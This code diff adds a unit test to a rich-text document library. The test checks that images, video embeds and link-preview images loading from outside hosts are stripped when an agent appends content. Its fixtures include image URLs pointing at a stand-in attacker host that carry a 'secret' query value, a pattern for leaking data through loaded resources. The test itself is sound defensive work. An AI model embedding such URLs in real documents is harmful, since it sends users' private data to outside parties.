@@ -671,6 +671,30 @@ describe('updateRichTextYDoc', () => {
     })
   })
 
+  it('writes nothing that loads from elsewhere, as an agent might be told to', () => {
+    const doc = createDoc([paragraph('Before')])
+
+    expect(
+      updateRichTextYDoc(doc, {
+        type: 'append',
+        blocks: [
+          { type: 'image', props: { url: 'https://attacker.example/pixel.png?q=secret' } },
+          { type: 'videoEmbed', props: { url: 'https://vimeo.com/76979871' } },
+          {
+            type: 'linkPreview',
+            props: { url: 'https://example.com/', title: 'Example', imageUrl: 'https://attacker.example/q=secret' },
+          },
+          paragraph('After'),
+        ],
+      }),
+    ).toEqual({ outcome: 'updated' })
+    expect(read(doc)).toEqual([
+      paragraph('Before'),
+      { type: 'linkPreview', props: { url: 'https://example.com/', title: 'Example' } },
+      paragraph('After'),
+    ])
+  })
+
   it('appends to a document with no text yet in place of its empty paragraph', () => {
     const doc = createDoc([])
 
